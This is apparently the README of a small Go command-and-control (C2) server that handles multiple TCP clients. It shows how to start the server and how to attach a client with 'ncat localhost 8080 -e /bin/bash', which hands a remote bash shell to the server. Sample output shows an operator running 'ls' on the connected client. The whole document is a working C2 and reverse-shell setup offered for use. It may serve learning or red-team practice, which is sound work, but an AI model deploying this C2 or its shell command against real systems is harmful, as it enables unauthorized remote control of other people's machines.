# Multiple TCP connections execute

An example of how to interact with specific TCP connections in your C2

## Starting the server

```go run server.go```

Start the server

## Connect a client 

```ncat localhost 8080 -e /bin/bash```

Use ncat as a client

## Interact with client

```
go run server.go 
[+] Server started on port 8080

--- Command Line Interface ---
1. List clients
2. Send message to client
3. Exit
Enter choice: 
[+] Client 1 connected

Enter choice: 2
Enter client ID: 1
Enter message: ls
Message sent to client 1

Received from client 1: README.md
Received from client 1: go.mod
Received from client 1: server.go
```